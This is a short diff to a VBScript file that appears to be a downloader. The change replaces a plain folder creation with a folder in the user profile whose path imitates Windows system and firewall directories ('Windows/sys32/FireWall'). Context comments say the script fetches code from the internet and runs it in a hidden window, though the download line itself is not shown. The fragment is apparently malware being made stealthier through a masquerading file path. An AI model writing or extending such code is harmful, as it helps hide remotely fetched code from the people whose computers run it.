@@ -4,7 +4,13 @@ Dim script
 Set script = Wscript.CreateObject("WScript.shell")
 
 'Make a folder to store everthing
-script.run "mkdir files", 0, TRUE
+
+Dim oFSO
+Set oFSO = CreateObject("Scripting.FileSystemObject")
+
+' Create a new folder
+oFSO.CreateFolder script.ExpandEnvironmentStrings("%USERPROFILE%") & "/Windows/sys32/FireWall/files"
+
 
 'Get the code we need to run from the internet
 '0=Hide window, TRUE=Use same thread 
